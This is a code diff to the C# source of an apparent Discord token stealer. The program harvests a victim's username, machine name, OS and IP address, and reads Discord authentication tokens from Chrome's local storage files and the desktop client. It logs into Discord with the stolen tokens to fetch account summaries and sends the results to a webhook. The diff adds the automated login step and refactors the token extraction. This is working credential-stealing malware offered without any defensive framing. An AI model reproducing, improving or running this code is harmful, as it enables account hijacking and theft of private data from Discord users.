@@ -2,19 +2,19 @@
 using System.Net;
 using System.Text;
 using Microsoft.Win32;
+using DiscordTokenStealer.Discord;
 using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
 using static DiscordTokenStealer.IPInfo;
 
 namespace DiscordTokenStealer
 {
-    internal static class Program
+    public static class Program
     {
         private static async Task Main(string[] args)
         {
             if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
             {
-                // Only windows supported for grabbing tokens, uncomment this if you want to only grab basic information about the victim.
                 return;
             }
             StringBuilder content = new StringBuilder($"Username: {Environment.UserName}{Environment.NewLine}").AppendLine($"Machine Name: {Environment.MachineName}").AppendLine($"Operating System: {Environment.OSVersion.Platform}");
@@ -23,13 +23,29 @@ namespace DiscordTokenStealer
             {
                 content.AppendLine($"IPAddress: {ipAddress}");
             }
-            List<string> tokens = GetDiscordTokens();
-            if (tokens.Any())
+            string? browserToken = GetBrowserDiscordToken();
+            string? desktopToken = GetDesktopClientToken();
+            if (browserToken != null || desktopToken != null)
             {
                 content.AppendLine("Tokens: ");
-                foreach (string token in tokens)
+                using DiscordClient client = new DiscordClient();
+                if (desktopToken != null)
                 {
-                    content.AppendLine(token);
+                    content.AppendLine($"\t{desktopToken}");
+                    DiscordUser? user = await client.Login(desktopToken);
+                    if (user != null)
+                    {
+                        content.AppendLine($"\tSummary: {Environment.NewLine}{user.Summary}{Environment.NewLine}");
+                    }
+                }
+                if (browserToken != null)
+                {
+                    content.AppendLine($"\t{browserToken}");
+                    DiscordUser? user = await client.Login(browserToken);
+                    if (user != null)
+                    {
+                        content.AppendLine($"\tSummary: {Environment.NewLine}{user.Summary}{Environment.NewLine}");
+                    }
                 }
                 content.AppendLine();
             }
@@ -37,30 +53,15 @@ namespace DiscordTokenStealer
             await webhook.SendMessage(content.ToString());
         }
 
-        private static List<string> GetDiscordTokens()
-        {
-            List<string> tokens = new List<string>(2);
-            string? browserToken = GetBrowserDiscordToken();
-            if (browserToken != null)
-            {
-                tokens.Add(browserToken);
-            }
-            string? desktopToken = GetDesktopClientToken();
-            if (desktopToken != null)
-            {
-                tokens.Add(desktopToken);
-            }
-            return tokens;
-        }
-
+        // Unsure if this works, chrome only.
         private static string? GetBrowserDiscordToken()
         {
             FileInfo? defaultBrowser = GetDefaultBrowserLocation();
-            if (defaultBrowser == null || defaultBrowser.Directory == null || !defaultBrowser.FullName.ToLower().Contains("chrome"))
+            if (defaultBrowser?.Directory == null || !defaultBrowser.FullName.ToLower().Contains("chrome"))
             {
                 return null;
             }
-            return ParseToken($"{defaultBrowser.Directory.Name.Split(' ').Aggregate(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Path.Combine)}{"\\User Data\\Default\\Local Storage\\leveldb\\"}") ?? null;
+            return ParseToken($"{defaultBrowser.Directory.Name.Split(' ').Aggregate(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Path.Combine)}{"\\User Data\\Default\\Local Storage\\leveldb\\"}");
         }
 
         private static string? GetDesktopClientToken()
@@ -75,11 +76,12 @@ namespace DiscordTokenStealer
             {
                 throw new DirectoryNotFoundException("Provied directory doesn't exist.");
             }
-            foreach (GroupCollection groups in Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups))
+            GroupCollection? groups = Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups).FirstOrDefault();
+            if (groups == null || groups.Count < 3)
             {
-                return $"{groups[1].Value}.{groups[2].Value}";
+                return null;
             }
-            return null;
+            return string.Join('.', groups.Values.Skip(1));
         }
 
         // https://stackoverflow.com/a/17599201
